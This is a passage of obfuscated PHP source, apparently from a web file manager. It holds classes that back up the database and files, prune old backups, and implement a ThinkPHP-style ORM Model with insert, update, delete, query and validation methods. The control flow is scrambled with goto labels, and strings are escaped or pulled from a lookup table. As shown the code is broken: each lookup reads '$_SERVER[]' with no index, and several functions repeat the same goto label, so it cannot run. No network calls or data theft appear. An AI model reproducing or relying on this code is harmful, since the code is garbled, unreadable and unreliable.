self::$option; } public function keep() { $E =& $_SERVER[]; $eɑݮ = self::get(); if ($eɑݮ[$E[281]][$E[692]][$E[688]] == $E[83]) { return; } $this->backupKeep($eɑݮ); self::set(array($E[703] => 1)); } private function backupKeep($Eޮ) { goto AҲ; Bױ: for ($F㉴ = 0; $F㉴ < 12; $F㉴++) { $A[] = date($eͲ[704], strtotime("\x2d{$F㉴}\x20\x6d\x6f\156\x74\x68\163")); } $A = array_unique($A); foreach ($d as $dሃ) { if (!empty($dሃ[$eͲ[28]]) && in_array($dሃ[$eͲ[28]], $A)) { continue; } Model($eͲ[687])->remove($dሃ[$eͲ[367]]); $AÃ = "\x7b\x69\157\72{$Eޮ[$eͲ[690]]}\x7d\57\x64\141\164\x61\142\141\x73\x65\x2f\142\141\143\x6b\x75\x70\x5f{$dሃ[$eͲ[28]]}"; IO::remove($AÃ, !1); } goto Cі¢Ԇ; bƻ: $F㉴ = 0; $A = array(); foreach ($d as $dሃ) { if ($F㉴ >= 7) { break; } $A[] = $dሃ[$eͲ[28]]; $F㉴++; } goto Bױ; AҲ: $eͲ =& $_SERVER[]; $d = Model($eͲ[687])->listData(); if (empty($d)) { return; } goto bƻ; Cі¢Ԇ: } public function db() { goto fѢ; fѢ: $c梗 =& $_SERVER[]; $b = self::get(); if ($b[$c梗[281]][$c梗[693]][$c梗[688]] == $c梗[83]) { return !0; } goto E߸; E߸: $Bڬ = new BackupDb(); if (!$Bڬ->index()) { return !1; } self::set(array($c梗[705] => 1)); goto a; a: return !0; goto bԯ; bԯ: } public function dbFile() { goto EИ; FЇۑ: $a = new BackupDbFile(); if (!$a->index()) { return !1; } self::set(array($D[706] => 1)); goto BЍ됹; EИ: $D =& $_SERVER[]; $b = self::get(); if ($b[$D[281]][$D[696]][$D[688]] == $D[83]) { return !0; } goto FЇۑ; BЍ됹: return !0; goto C٬; C٬: } public function file() { $dɩ =& $_SERVER[]; $b̶ = self::get(); if ($b̶[$dɩ[281]][$dɩ[167]][$dɩ[688]] == $dɩ[83]) { return !0; } if (!isset($b̶[$dɩ[691]]) || $b̶[$dɩ[691]] == $dɩ[470]) { $FǸ = new BackupFile(); if (!$FǸ->index()) { return !1; } } self::set(array($dɩ[707] => 1, $dɩ[688] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto c攳; F럌ܡ: $A = new DbManage($b, $f拺); $bެ = TEMP_FILES . $cȔڗ[708] . self::$name . $cȔڗ[8]; del_dir($bެ); goto e˫; C޹: Backup::set($C); return !0; goto a; c攳: $cȔڗ =& $_SERVER[]; $Aï = Backup::get(); self::$io = $Aï[$cȔڗ[690]]; goto DĄ; DĄ: self::$name = $Aï[$cȔڗ[28]]; $b = $GLOBALS[$cȔڗ[6]][$cȔڗ[17]]; $f拺 = $this->_dbType($b); goto F럌ܡ; a: foreach ($a󷦨 as $Cݲ) { $E󶣥 = $bެ . $Cݲ . $cȔڗ[716]; $bͺ = null; if ($Cݲ == $cȔڗ[717] && (!isset($Aï[$cȔڗ[691]]) || $Aï[$cȔڗ[691]] == $cȔڗ[470])) { $bͺ = self::$io; } $f += $A->sqlFromDb($Cݲ, $E󶣥, $d⃢, $bͺ); } $d⃢->end(); $C = array($cȔڗ[718] => $f拺, $cȔڗ[705] => 1, $cȔڗ[719] => $f, $cȔڗ[720] => $f); goto C޹; Aɺ: $a󷦨 = array_diff($a󷦨, array($cȔڗ[709], $cȔڗ[710])); foreach ($a󷦨 as $Cݲ) { $AΙ += $A->model($Cݲ)->count(); } $d⃢ = new Task($cȔڗ[711], $cȔڗ[712], $AΙ, LNG($cȔڗ[713]) . $cȔڗ[714] . LNG($cȔڗ[715])); goto a; e˫: mk_dir($bެ); $AΙ = $f = 0; $a󷦨 = $A->db()->getTables(); goto Aɺ; a: } private function _dbType($Bƭ) { goto d; c㋞: if ($f == $d򞭾[722]) { $aճŏ = explode($d򞭾[4], $Bƭ[$d򞭾[723]]); $f = $aճŏ[0]; } $D = array($d򞭾[724] => $d򞭾[9], $d򞭾[725] => $d򞭾[726]); if (isset($D[$f])) { $f = $D[$f]; } goto d; d: return $f; goto A̪; d: $d򞭾 =& $_SERVER[]; $Bƭ = array_change_key_case($Bƭ); $f = $Bƭ[$d򞭾[721]]; goto c㋞; A̪: } } class BackupDbFile { public function __construct() { } public function index() { goto DッϏ; f: $f->end(); Backup::set(array($fϣފ[732] => $fڨ[$fϣފ[77]])); return !0; goto B; F񺅙: Backup::set(array($fϣފ[729] => $fڨ[$fϣފ[77]])); IO::move($a, $F߬); $b = CONTROLLER_DIR . $fϣފ[730]; goto FԸ; AޕԞ: $a = TEMP_FILES . "\x62\141\143\153\x75\x70\x5f{$C}\57"; $F߬ = "\x7b\x69\157\72{$cˏ[$fϣފ[690]]}\175\57\x64\141\164\x61\142\141\x73\x65\x2f"; IO::mkdir($F߬ . "\x62\x61\143\x6b\165\x70\137{$C}\x2f"); goto eᵗ; eᵗ: $f = new TaskFileTransfer($fϣފ[727], $fϣފ[712], 0, LNG($fϣފ[713]) . $fϣފ[412] . LNG($fϣފ[715]) . $fϣފ[728]); $f->addPath($a); $fڨ = IO::infoWithChildren($a); goto F񺅙; DッϏ: $fϣފ =& $_SERVER[]; $cˏ = Backup::get(); $C = $cˏ[$fϣފ[28]]; goto AޕԞ; FԸ: $eڙ = CONTROLLER_DIR . $fϣފ[731]; IO::copy($b, $F߬ . "\142\141\x63\x6b\x75\160\137{$C}\x2f"); IO::copy($eڙ, $F߬ . "\142\x61\x63\153\x75\x70\137{$C}\57"); goto f; B: } } goto cʢ; Aʍ: define($_SERVER[][230], 0); define($_SERVER[][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\x72\x64\x65\x72", "\141\x6c\x69\x61\x73", "\x68\x61\x76\x69\156\x67", "\x67\x72\x6f\165\160", "\x6c\x6f\143\153", "\x64\x69\x73\x74\151\156\143\x74", "\141\x75\x74\x6f", "\x66\151\154\x74\x65\162", "\166\x61\154\151\x64\x61\x74\x65", "\162\145\x73\x75\154\164", "\x62\x69\156\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($a¦񎊙 = '', $AϞ = '', $aյ؎ = '') { $e᪰ =& $_SERVER[]; $this->_initialize(); if (!empty($a¦񎊙)) { if (strpos($a¦񎊙, $e᪰[91])) { list($this->dbName, $this->name) = explode($e᪰[91], $a¦񎊙); } else { $this->name = $a¦񎊙; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($AϞ)) { $this->tablePrefix = $e᪰[33]; } elseif ($e᪰[33] != $AϞ) { $this->tablePrefix = $AϞ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($e᪰[232]); } $this->db(0, empty($this->connection) ? $aյ؎ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $B˭ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($B˭[233])) { $a = $this->dbName ? $this->dbName : think_config($B˭[234]); $a俤 = think_var_cache($B˭[235] . strtolower(get_path_this($a) . $B˭[91] . $this->name)); if ($a俤) { $d = think_config($B˭[236]); if (empty($d) || $a俤[$B˭[237]] == $d) { $this->fields = $a俤; return; } } } $this->flush(); } } public function flush() { goto Aᅘ; Aƶ: if (think_config($A؎[233])) { $Bխ = $this->dbName ? $this->dbName : think_config($A؎[234]); think_var_cache($A؎[235] . strtolower(get_path_this($Bխ) . $A؎[91] . $this->name), $this->fields); } goto cӦŉ; c޺: if (!$e) { return !1; } $this->fields = array_keys($e); $this->fields[$A؎[238]] = !1; goto f߰; f߰: foreach ($e as $A => $CՆ) { $d֖[$A] = $CՆ[$A؎[29]]; if ($CՆ[$A؎[36]]) { $this->fields[$A؎[239]] = $A; if ($CՆ[$A؎[39]]) { $this->fields[$A؎[238]] = !0; } } } $this->fields[$A؎[240]] = $d֖; if (think_config($A؎[236])) { $this->fields[$A؎[237]] = think_config($A؎[236]); } goto Aƶ; Aᅘ: $A؎ =& $_SERVER[]; $this->db->setModel($this->name); $e = $this->db->getFields($this->getTableName()); goto c޺; cӦŉ: } public function switchModel($B̲, $Cʯ = array()) { $B܇ՠԚ =& $_SERVER[]; $f޾ұ = ucwords(strtolower($B̲)) . $B܇ՠԚ[241]; if (!class_exists($f޾ұ)) { think_exception($f޾ұ . think_lang($B܇ՠԚ[242])); } $this->_extModel = new $f޾ұ($this->name); if (!empty($Cʯ)) { foreach ($Cʯ as $d) { $this->_extModel->setProperty($d, $this->{$d}); } } return $this->_extModel; } public function __set($e, $D峜) { $this->data[$e] = $D峜; } public function __get($c) { return isset($this->data[$c]) ? $this->data[$c] : null; } public function __isset($F߸) { return isset($this->data[$F߸]); } public function __unset($Eㆤʬ) { unset($this->data[$Eㆤʬ]); } public function __call($d٨, $bƅ) { $AȜ =& $_SERVER[]; if (in_array(strtolower($d٨), $this->methods, !0)) { $this->options[strtolower($d٨)] = $bƅ[0]; return $this; } elseif (in_array(strtolower($d٨), array($AȜ[243], $AȜ[244], $AȜ[245], $AȜ[246], $AȜ[247]), !0)) { $C딕械 = isset($bƅ[0]) ? $bƅ[0] : $AȜ[176]; $C딕械 = $this->db->parseKey($C딕械); return $this->getField(strtoupper($d٨) . $AȜ[248] . $C딕械 . $AȜ[249] . $d٨, $AȜ[243]); } elseif (strtolower(substr($d٨, 0, 5)) == $AȜ[250]) { $C딕械 = think_parse_name(substr($d٨, 5)); $F߄Ǫ[$C딕械] = $bƅ[0]; return $this->where($F߄Ǫ)->find(); } elseif (strtolower(substr($d٨, 0, 10)) == $AȜ[251]) { $bԖ = think_parse_name(substr($d٨, 10)); $F߄Ǫ[$bԖ] = $bƅ[0]; return $this->where($F߄Ǫ)->getField($bƅ[1]); } elseif (isset($this->_scope[$d٨])) { return $this->scope($d٨, $bƅ[0]); } elseif (method_exists($this, $d٨)) { array_unshift($bƅ, $d٨); return call_user_func_array(array($this, $AȜ[252]), $bƅ); } else { return call_user_func_array(array(parent, $d٨), $bƅ); } } protected function call() { goto bؤ; E: if (isset($aػݿ[$F糩]) && $aػݿ[$F糩] === $F折Ď) { think_exception(__CLASS__ . $d[4] . $F折Ď . think_lang($d[253])); return; } $aػݿ[] = $F折Ď; if (method_exists($this, $d[254])) { $d˾ڧ = call_user_func_array(array($this, $d[255]), array($dդ, $aػݿ)); if (!is_null($d˾ڧ) && $d˾ڧ !== !1) { return $d˾ڧ; } } goto d쐉; D׈: $dդ = $F折Ď; if (is_array($F折Ď)) { $dդ = $F折Ď[1]; $F折Ď = $F折Ď[0]; } $F糩 = count($aػݿ) - 1; goto E; bؤ: $d =& $_SERVER[]; $aػݿ = func_get_args(); $F折Ď = array_shift($aػݿ); goto D׈; d쐉: $eʔ = call_user_func_array(array($this, $F折Ď), $aػݿ); if (method_exists($this, $d[256])) { $d˾ڧ = call_user_func_array(array($this, $d[257]), array($dդ, $aػݿ, $eʔ)); if ($d˾ڧ) { return $d˾ڧ; } } return $eʔ; goto E; E: } protected function _initialize() { } protected function _facade($AҬ) { $AԲ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($AҬ as $Fґτ => $eֹ) { if (!in_array($Fґτ, $this->fields, !0)) { unset($AҬ[$Fґτ]); } elseif (is_scalar($eֹ)) { $this->_parseType($AҬ, $Fґτ); } } } if (!empty($this->options[$AԲ[258]])) { $AҬ = array_map($this->options[$AԲ[258]], $AҬ); unset($this->options[$AԲ[258]]); } $this->_beforeWrite($AҬ); return $AҬ; } protected function _beforeWrite(&$fޗȞ) { } public function add($cƯШ = '', $F = array(), $EϘ = false) { goto B鰏ۇ; fވЧ: if (!1 === $this->_beforeInsert($cƯШ, $F)) { return !1; } $A՞ = $this->db->insert($cƯШ, $F, $EϘ); if (!1 !== $A՞) { $b̲ۃ = $this->getLastInsID(); if ($b̲ۃ) { $cƯШ[$this->getPk()] = $b̲ۃ; $this->_after_insert($cƯШ, $F); return $b̲ۃ; } $this->_after_insert($cƯШ, $F); } goto eڄ; B鰏ۇ: if (empty($cƯШ)) { if (!empty($this->data)) { $cƯШ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][259]); return !1; } } $F = $this->_parseOptions($F); $cƯШ = $this->_facade($cƯШ); goto fވЧ; eڄ: return $A՞; goto aɚ; aɚ: } protected function _beforeInsert(&$E̪, $CϚ䆹) { } protected function _after_insert($D, $dݯ) { } public function addAll($A, $C߲ = array(), $d = false) { goto C󸆼; eͩÒ: foreach ($A as $f֨ => $f) { $A[$f֨] = $this->_facade($f); } if (method_exists($this->db, $eď[260])) { $aЭ = $this->db->insertAll($A, $C߲, $d); } else { $this->startTrans(); foreach ($A as $f֨ => $f) { $aЭ = $this->db->insert($f, $C߲, $d); } $this->commit(); } if (!1 !== $aЭ) { $f = $this->getLastInsID(); if ($f) { return $f; } } goto Bې; C󸆼: $eď =& $_SERVER[]; if (empty($A)) { $this->error = think_lang($eď[259]); return !1; } $C߲ = $this->_parseOptions($C߲); goto eͩÒ; Bې: return $aЭ; goto b; b: } public function selectAdd($Aɲ = '', $AӞͭ = '', $A = array()) { $C =& $_SERVER[]; $A = $this->_parseOptions($A); if (!1 === ($A = $this->db->selectInsert($Aɲ ? $Aɲ : $A[$C[261]], $AӞͭ ? $AӞͭ : $this->getTableName(), $A))) { $this->error = think_lang($C[262]); return !1; } else { return $A; } } public function save($eʡ׊ӑ = '', $bƮؽ = array()) { goto A﫟; A﫟: $D =& $_SERVER[]; if (empty($eʡ׊ӑ)) { if (!empty($this->data)) { $eʡ׊ӑ = $this->data; $this->data = array(); } else { $this->error = think_lang($D[259]); return !1; } } $eʡ׊ӑ = $this->_facade($eʡ׊ӑ); goto d̎; B䞷ʤ: if (!1 !== $cŊ) { if (isset($E󌆌)) { $eʡ׊ӑ[$dꃕ] = $E󌆌; } $this->_afterUpdate($eʡ׊ӑ, $bƮؽ); } return $cŊ; goto B; d̎: $bƮؽ = $this->_parseOptions($bƮؽ); $dꃕ = $this->getPk(); if (!isset($bƮؽ[$D[263]])) { if (isset($eʡ׊ӑ[$dꃕ])) { $eփ[$dꃕ] = $eʡ׊ӑ[$dꃕ]; $bƮؽ[$D[263]] = $eփ; unset($eʡ׊ӑ[$dꃕ]); } else { $this->error = think_lang($D[262]); return !1; } } goto C; C: if (is_array($bƮؽ[$D[263]]) && isset($bƮؽ[$D[263]][$dꃕ])) { $E󌆌 = $bƮؽ[$D[263]][$dꃕ]; } if (!1 === $this->_beforeUpdate($eʡ׊ӑ, $bƮؽ)) { return !1; } $cŊ = $this->db->update($eʡ׊ӑ, $bƮؽ); goto B䞷ʤ; B: } protected function _beforeUpdate(&$Dڮڙ, $Cɹ) { } protected function _afterUpdate($b萈ď, $c悿°) { } public function delete($bҙݭ = array()) { goto cؚ; bǹʱ: $fФћ = $this->db->delete($bҙݭ); if (!1 !== $fФћ) { $Bӡ = array(); if (isset($DЄԐϺ)) { $Bӡ[$E] = $DЄԐϺ; } $this->_after_delete($Bӡ, $bҙݭ); } return $fФћ; goto dł; cؚ: $A =& $_SERVER[]; if (empty($bҙݭ) && empty($this->options[$A[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $E = $this->getPk(); goto f; f: if (is_numeric($bҙݭ) || is_string($bҙݭ)) { if (strpos($bҙݭ, $A[47])) { $f̐[$E] = array($A[264], $bҙݭ); } else { $f̐[$E] = $bҙݭ; } $this->options[$A[263]] = $f̐; } $bҙݭ = $this->_parseOptions(); if (is_array($bҙݭ[$A[263]]) && isset($bҙݭ[$A[263]][$E])) { $DЄԐϺ = $bҙݭ[$A[263]][$E]; } goto bǹʱ; dł: } protected function _after_delete($D޴, $E܂) { } public function select($b桶 = array()) { goto A; cǌ: $this->_afterSelect($D, $b桶); return $D; goto aȒ; A: $dǞ =& $_SERVER[]; if (is_string($b桶) || is_numeric($b桶)) { $E = $this->getPk(); if (strpos($b桶, $dǞ[47])) { $fŕﰹ[$E] = array($dǞ[264], $b桶); } else { $fŕﰹ[$E] = $b桶; } $this->options[$dǞ[263]] = $fŕﰹ; } elseif (!1 === $b桶) { $b桶 = $this->_parseOptions(); return $dǞ[265] . $this->db->buildSelectSql($b桶) . $dǞ[266]; } $b桶 = $this->_parseOptions(); goto C􎈗; C􎈗: $D = $this->db->select($b桶); if (!1 === $D) { return !1; } if (empty($D)) { return null; } goto cǌ; aȒ: } protected function _afterSelect(&$b, $aØ) { } public function buildSql($Bы׉ = array()) { $B =& $_SERVER[]; $Bы׉ = $this->_parseOptions($Bы׉); return $B[265] . $this->db->buildSelectSql($Bы׉) . $B[266]; } public function optionsValue($Fܦ͐ = null) { if (is_null($Fܦ͐)) { return $this->options; } elseif (is_array($Fܦ͐)) { $this->options = array_merge($this->options, $Fܦ͐); } } protected function _parseOptions($e = array()) { goto CӉܿ; E: if (isset($e[$D㜲[263]]) && is_array($e[$D㜲[263]]) && !empty($C) && !isset($e[$D㜲[270]]) && !isset($e[$D㜲[267]])) { foreach ($e[$D㜲[263]] as $e㳿 => $A𧝫) { $e㳿 = trim($e㳿); if (in_array($e㳿, $C, !0)) { if (is_scalar($A𧝫)) { $this->_parseType($e[$D㜲[263]], $e㳿); } } elseif (!is_numeric($e㳿) && $D㜲[70] != substr($e㳿, 0, 1) && !1 === strpos($e㳿, $D㜲[91]) && !1 === strpos($e㳿, $D㜲[248]) && !1 === strpos($e㳿, $D㜲[271]) && !1 === strpos($e㳿, $D㜲[272])) { unset($e[$D㜲[263]][$e㳿]); } } } $this->_options_filter($e); return $e; goto A; aƦ갈: if (!isset($e[$D㜲[267]])) { $e[$D㜲[267]] = $this->getTableName(); $C = $this->fields; } else { $C = $this->getDbFields(); } if (!empty($e[$D㜲[268]])) { $e[$D㜲[267]] .= $D㜲[50] . $e[$D㜲[268]]; } $e[$D㜲[269]] = $this->name; goto E; CӉܿ: $D㜲 =& $_SERVER[]; if (is_array($e)) { $e = array_merge($this->options, $e); } $this->options = array(); goto aƦ갈; A: } protected function _options_filter(&$A׺̞) { } protected function _parseType(&$e˨, $fڧ) { $C =& $_SERVER[]; if (empty($this->options[$C[273]][$C[4] . $fڧ])) { $DՊ = strtolower($this->fields[$C[240]][$fڧ]); if (!1 !== strpos($DՊ, $C[274])) { } elseif (!1 === strpos($DՊ, $C[275]) && !1 !== strpos($DՊ, $C[276])) { $e˨[$fڧ] = intval($e˨[$fڧ]); } elseif (!1 !== strpos($DՊ, $C[277]) || !1 !== strpos($DՊ, $C[278])) { $e˨[$fڧ] = floatval($e˨[$fڧ]); } elseif (!1 !== strpos($DՊ, $C[279])) { $e˨[$fڧ] = (bool) $e˨[$fڧ]; } } } public function find($b䑨Ͻ = array()) { goto AÃ; D樼: if (empty($cֻ)) { return null; } $this->data = $cֻ[0]; $this->_afterFind($this->data, $b䑨Ͻ); goto EЏɱ; c: $b䑨Ͻ = $this->_parseOptions(); $cֻ = $this->db->select($b䑨Ͻ); if (!1 === $cֻ) { return !1; } goto D樼; EЏɱ: if (!empty($this->options[$a[281]])) { return $this->returnResult($this->data, $this->options[$a[281]]); } return $this->data; goto fϒ; AÃ: $a =& $_SERVER[]; if (is_numeric($b䑨Ͻ) || is_string($b䑨Ͻ)) { $a⊆̺ٓ[$this->getPk()] = intval($b䑨Ͻ); $this->options[$a[263]] = $a⊆̺ٓ; } $this->options[$a[280]] = 1; goto c; fϒ: } protected function _afterFind(&$F, $F𝙣) { } protected function returnResult($eԢ, $cО = '') { $Eѥމ =& $_SERVER[]; if ($cО) { if (is_callable($cО)) { return call_user_func($cО, $eԢ); } switch (strtolower($cО)) { case $Eѥމ[282]: return json_encode($eԢ); case $Eѥމ[283]: return xml_encode($eԢ); } } return $eԢ; } public function parseFieldsMap($Eӿߺ, $e׃ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $C퐔 => $A) { if ($e׃ == 1) { if (isset($Eӿߺ[$A])) { $Eӿߺ[$C퐔] = $Eӿߺ[$A]; unset($Eӿߺ[$A]); } } else { if (isset($Eӿߺ[$C퐔])) { $Eӿߺ[$A] = $Eӿߺ[$C퐔]; unset($Eӿߺ[$C퐔]); } } } } return $Eӿߺ; } public function setField($D, $Aㅨ꛾ = '') { if (is_array($D)) { $F = $D; } else { $F[$D] = $Aㅨ꛾; } return $this->save($F); } public function setAdd($e͋, $Eè = 1) { $C۠ =& $_SERVER[]; $D = $e͋ . $C۠[284] . $Eè; if ($Eè < 0) { $D = $e͋ . $Eè; } return $this->setField($e͋, array($C۠[285], $D)); } public function getField($a, $bɕ = null) { $D =& $_SERVER[]; $d뼆[$D[261]] = $a; $d뼆 = $this->_parseOptions($d뼆); $a = trim($a); if (strpos($a, $D[47])) { if (!isset($d뼆[$D[280]])) { $d뼆[$D[280]] = is_numeric($bɕ) ? $bɕ : $D[33]; } $b = $this->db->select($d뼆); if (!empty($b)) { goto c; c: $fѪ = explode($D[47], $a); $a = array_keys($b[0]); $F = array_shift($a); goto bŚ; bŚ: $f = array_shift($a); $D塲 = array(); $c·ʎݏ = count($fѪ); goto a; a: foreach ($b as $DӉ̤) { $b = $DӉ̤[$F]; if (2 == $c·ʎݏ) { $D塲[$b] = $DӉ̤[$f]; } else { $D塲[$b] = is_string($bɕ) ? implode($bɕ, $DӉ̤) : $DӉ̤; } } return $D塲; goto B; B: } } else { if (!0 !== $bɕ) { $d뼆[$D[280]] = is_numeric($bɕ) ? $bɕ : 1; } if ($bɕ === $D[243]) { unset($d뼆[$D[280]]); } $DӉ̤ = $this->db->select($d뼆); if (!empty($DӉ̤)) { if ($bɕ === $D[243]) { return reset($DӉ̤[0]); } if (!0 !== $bɕ && 1 == $d뼆[$D[280]]) { return reset($DӉ̤[0]); } foreach ($DӉ̤ as $eȢɆ) { $bՙ[] = $eȢɆ[$a]; } return $bՙ; } } return null; } public function create($d̲ = '', $c˞ = '') { goto c֕ƒ; f߈: $d̲ = $this->parseFieldsMap($d̲, 0); $c˞ = $c˞ ? $c˞ : (!empty($d̲[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$E[261]])) { $Eȅ = $this->options[$E[261]]; unset($this->options[$E[261]]); } elseif ($c˞ == THINK_MODEL_INSERT && isset($this->insertFields)) { $Eȅ = $this->insertFields; } elseif ($c˞ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Eȅ = $this->updateFields; } goto c׫; c׫: if (isset($Eȅ)) { if (is_string($Eȅ)) { $Eȅ = explode($E[47], $Eȅ); } if (think_config($E[286])) { $Eȅ[] = think_config($E[287]); } foreach ($d̲ as $c֑أ => $Cك) { if (!in_array($c֑أ, $Eȅ)) { unset($d̲[$c֑أ]); } } } if (!$this->autoValidation($d̲, $c˞)) { return !1; } if (!$this->autoCheckToken($d̲)) { $this->error = think_lang($E[288]); return !1; } goto Bɝ; Bɝ: if ($this->autoCheckFields) { $Eȅ = $this->getDbFields(); foreach ($d̲ as $c֑أ => $Cك) { if (!in_array($c֑أ, $Eȅ)) { unset($d̲[$c֑أ]); } elseif (MAGIC_QUOTES_GPC && is_string($Cك)) { $d̲[$c֑أ] = stripslashes($Cك); } } } $this->autoOperation($d̲, $c˞); $this->data = $d̲; goto f; f: return $d̲; goto f맽; c֕ƒ: $E =& $_SERVER[]; if (empty($d̲)) { $d̲ = $_POST; } elseif (is_object($d̲)) { $d̲ = get_object_vars($d̲); } if (empty($d̲) || !is_array($d̲)) { $this->error = think_lang($E[259]); return !1; } goto f߈; f맽: } public function autoCheckToken($Bևȷ) { $a =& $_SERVER[]; if (isset($this->options[$a[289]]) && !$this->options[$a[289]]) { return !0; } if (think_config($a[286])) { $f = think_config($a[287]); if (!isset($Bևȷ[$f]) || Session::get($f)) { return !1; } list($f葳, $Dξ) = explode($a[70], $Bևȷ[$f]); if ($Dξ && Session::get($f . $a[91] . $f葳) === $Dξ) { Session::remove($f . $a[91] . $f葳); return !0; } if (think_config($a[290])) { Session::remove($f . $a[91] . $f葳); } return !1; } return !0; } public function regex($Eթ, $c) { $A =& $_SERVER[]; $ê = array($A[291] => $A[292], $A[293] => $A[294], $A[295] => $A[296], $A[297] => $A[298], $A[299] => $A[300], $A[301] => $A[302], $A[303] => $A[304], $A[278] => $A[305], $A[306] => $A[307]); if (isset($ê[strtolower($c)])) { $c = $ê[strtolower($c)]; } return preg_match($c, $Eթ) === 1; } private function autoOperation(&$e泒͞, $dใ) { $F =& $_SERVER[]; if (!empty($this->options[$F[308]])) { $bЫ = $this->options[$F[308]]; unset($this->options[$F[308]]); } elseif (!empty($this->_auto)) { $bЫ = $this->_auto; } if (isset($bЫ)) { foreach ($bЫ as $a֓ȷ) { if (empty($a֓ȷ[2])) { $a֓ȷ[2] = THINK_MODEL_INSERT; } if ($dใ == $a֓ȷ[2] || $a֓ȷ[2] == THINK_MODEL_BOTH) { switch (trim($a֓ȷ[3])) { case $F[309]: case $F[310]: $Bݱ = isset($a֓ȷ[4]) ? (array) $a֓ȷ[4] : array(); if (isset($e泒͞[$a֓ȷ[0]])) { array_unshift($Bݱ, $e泒͞[$a֓ȷ[0]]); } if ($F[309] == $a֓ȷ[3]) { $e泒͞[$a֓ȷ[0]] = call_user_func_array($a֓ȷ[1], $Bݱ); } else { $e泒͞[$a֓ȷ[0]] = call_user_func_array(array(&$this, $a֓ȷ[1]), $Bݱ); } break; case $F[261]: $e泒͞[$a֓ȷ[0]] = $e泒͞[$a֓ȷ[1]]; break; case $F[311]: if ($F[33] === $e泒͞[$a֓ȷ[0]]) { unset($e泒͞[$a֓ȷ[0]]); } break; case $F[312]: default: $e泒͞[$a֓ȷ[0]] = $a֓ȷ[1]; } if (!1 === $e泒͞[$a֓ȷ[0]]) { unset($e泒͞[$a֓ȷ[0]]); } } } } return $e泒͞; } protected function autoValidation($C, $Fݑȅ) { $Eڃ롸 =& $_SERVER[]; if (!empty($this->options[$Eڃ롸[313]])) { $dƹ = $this->options[$Eڃ롸[313]]; unset($this->options[$Eڃ롸[313]]); } elseif (!empty($this->_validate)) { $dƹ = $this->_validate; } if (isset($dƹ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dƹ as $C匍˚ => $FƇ) { if (empty($FƇ[5]) || $FƇ[5] == THINK_MODEL_BOTH || $FƇ[5] == $Fݑȅ) { if (0 == strpos($FƇ[2], $Eڃ롸[314]) && strpos($FƇ[2], $Eڃ롸[315])) { $FƇ[2] = think_lang(substr($FƇ[2], 2, -1)); } $FƇ[3] = isset($FƇ[3]) ? $FƇ[3] : THINK_EXISTS_VALIDATE; $FƇ[4] = isset($FƇ[4]) ? $FƇ[4] : $Eڃ롸[316]; switch ($FƇ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($C, $FƇ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Eڃ롸[33] != trim($C[$FƇ[0]])) { if (!1 === $this->_validationField($C, $FƇ)) { return !1; } } break; default: if (isset($C[$FƇ[0]])) { if (!1 === $this->_validationField($C, $FƇ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Dȵ, $B) { if (!1 === $this->_validationFieldItem($Dȵ, $B)) { if ($this->patchValidate) { $this->error[$B[0]] = $B[2]; } else { $this->error = $B[2]; return !1; } } return; } protected function _validationFieldItem($e, $B) { $aׂ̕ =& $_SERVER[]; switch (strtolower(trim($B[4]))) { case $aׂ̕[309]: case $aׂ̕[310]: $dܡ = isset($B[6]) ? (array) $B[6] : array(); if (is_string($B[0]) && strpos($B[0], $aׂ̕[47])) { $B[0] = explode($aׂ̕[47], $B[0]); } if (is_array($B[0])) { foreach ($B[0] as $D㻿) { $aӭ[$D㻿] = $e[$D㻿]; } array_unshift($dܡ, $aӭ); } else { array_unshift($dܡ, $e[$B[0]]); } if ($aׂ̕[309] == $B[4]) { return call_user_func_array($B[1], $dܡ); } else { return call_user_func_array(array(&$this, $B[1]), $dܡ); } case $aׂ̕[317]: return $e[$B[0]] == $e[$B[1]]; case $aׂ̕[318]: if (is_string($B[0]) && strpos($B[0], $aׂ̕[47])) { $B[0] = explode($aׂ̕[47], $B[0]); } $Fх = array(); if (is_array($B[0])) { foreach ($B[0] as $D㻿) { $Fх[$D㻿] = $e[$D㻿]; } } else { $Fх[$B[0]] = $e[$B[0]]; } if (!empty($e[$this->getPk()])) { $Fх[$this->getPk()] = array($aׂ̕[319], $e[$this->getPk()]); } if ($this->where($Fх)->find()) { return !1; } return !0; default: return $this->check($e[$B[0]], $B[1], $B[4]); } } public function check($E, $Aҳ, $Aˎ = "\162\145\147\x65\170") { $dӖ =& $_SERVER[]; $Aˎ = strtolower(trim($Aˎ)); switch ($Aˎ) { case $dӖ[7]: case $dӖ[320]: $aߖ = is_array($Aҳ) ? $Aҳ : explode($dӖ[47], $Aҳ); return $Aˎ == $dӖ[7] ? in_array($E, $aߖ) : !in_array($E, $aߖ); case $dӖ[321]: case $dӖ[322]: if (is_array($Aҳ)) { $F̈ = $Aҳ[0]; $C˜ = $Aҳ[1]; } else { list($F̈, $C˜) = explode($dӖ[47], $Aҳ); } return $Aˎ == $dӖ[321] ? $E >= $F̈ && $E <= $C˜ : $E < $F̈ || $E > $C˜; case $dӖ[323]: case $dӖ[324]: return $Aˎ == $dӖ[323] ? $E == $Aҳ : $E != $Aҳ; case $dӖ[325]: $CȖ = mb_strlen($E, $dӖ[326]); if 